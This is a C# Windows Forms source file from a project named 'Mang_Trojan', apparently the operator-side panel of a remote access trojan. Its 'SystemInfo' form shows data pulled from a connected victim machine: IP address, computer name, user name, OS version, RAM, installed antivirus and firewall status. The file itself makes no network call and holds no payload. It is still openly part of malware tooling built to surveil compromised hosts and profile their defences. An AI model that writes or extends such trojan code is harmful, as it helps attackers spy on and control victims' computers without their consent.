using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class SystemInfo : Form
    {
        ListViewItem listViewItem;
        ListViewItem.ListViewSubItem listSubItem;
        public SystemInfo(RemoteObject.ScreenObject hostInstance,string serverIp)
        {
            InitializeComponent();

            listViewItem = new ListViewItem();
            listViewItem.Text = serverIp;
            
            listSubItem = new ListViewItem.ListViewSubItem();
            listSubItem.Text = hostInstance.GetComputerName();
            listViewItem.SubItems.Add(listSubItem);

            listSubItem = new ListViewItem.ListViewSubItem();
            listSubItem.Text = hostInstance.GetUserName();
            listViewItem.SubItems.Add(listSubItem);

            listSubItem = new ListViewItem.ListViewSubItem();
            listSubItem.Text = hostInstance.GetOSVersion();
            listViewItem.SubItems.Add(listSubItem);

            listSubItem = new ListViewItem.ListViewSubItem();
            listSubItem.Text = hostInstance.GetRam();
            listViewItem.SubItems.Add(listSubItem);

            listSubItem = new ListViewItem.ListViewSubItem();
            listSubItem.Text = hostInstance.GetAntiVirus();
            listViewItem.SubItems.Add(listSubItem);

            listSubItem = new ListViewItem.ListViewSubItem();
            listSubItem.Text = hostInstance.GetFirewall();
            listViewItem.SubItems.Add(listSubItem);

            this.listViewServers.Items.Add(listViewItem);
        }
    }
}
